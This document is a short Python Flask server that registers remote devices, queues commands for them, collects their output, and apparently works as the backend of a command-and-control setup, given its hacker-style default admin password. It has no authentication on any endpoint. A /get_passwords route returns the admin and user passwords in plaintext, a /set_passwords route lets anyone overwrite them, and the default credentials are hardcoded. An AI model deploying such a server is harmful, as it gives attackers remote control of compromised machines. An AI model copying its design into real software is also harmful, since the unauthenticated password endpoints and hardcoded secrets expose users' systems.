from flask import Flask, request, jsonify
import os

app = Flask(__name__)

# In-memory storage
devices = {}
commands = {}
results = {}

# Device registration
@app.route('/register', methods=['POST'])
def register():
    data = request.json
    device_id = data.get('device_id')
    owner = data.get('owner')
    devices[device_id] = {'owner': owner, 'info': data}
    return jsonify({'status': 'registered'})

# Heartbeat
@app.route('/heartbeat/<device_id>', methods=['GET'])
def heartbeat(device_id):
    if device_id in devices:
        return jsonify({'status': 'alive'})
    return jsonify({'status': 'unknown device'}), 404

# Get devices
@app.route('/devices', methods=['GET'])
def get_devices():
    return jsonify(devices)

# Queue command
@app.route('/command', methods=['POST'])
def queue_command():
    data = request.json
    device_id = data.get('device_id')
    command = data.get('command')
    if device_id in devices:
        commands[device_id] = command
        return jsonify({'status': 'command queued'})
    return jsonify({'status': 'unknown device'}), 404

# Get command
@app.route('/get_command/<device_id>', methods=['GET'])
def get_command(device_id):
    command = commands.pop(device_id, None)
    if command:
        return jsonify({'command': command})
    return jsonify({'command': None})

# Post result
@app.route('/result', methods=['POST'])
def post_result():
    data = request.json
    device_id = data.get('device_id')
    output = data.get('output')
    results[device_id] = output
    return jsonify({'status': 'result received'})

# Get passwords
@app.route('/get_passwords', methods=['GET'])
def get_passwords():
    admin_password = os.environ.get('ADMIN_PASSWORD', 'default_admin')
    user_password = os.environ.get('USER_PASSWORD', 'default_user')
    return jsonify({'admin': admin_password, 'user': user_password})

# Set passwords
@app.route('/set_passwords', methods=['POST'])
def set_passwords():
    data = request.json
    admin_password = data.get('admin')
    user_password = data.get('user')
    if admin_password:
        os.environ['ADMIN_PASSWORD'] = admin_password
    if user_password:
        os.environ['USER_PASSWORD'] = user_password
    return jsonify({'status': 'passwords updated'})

if __name__ == '__main__':
    # Set default passwords if not already set
    os.environ.setdefault('ADMIN_PASSWORD', 'Cyb37h4ck37')
    os.environ.setdefault('USER_PASSWORD', 'user123')
    app.run(host='0.0.0.0', port=5000)
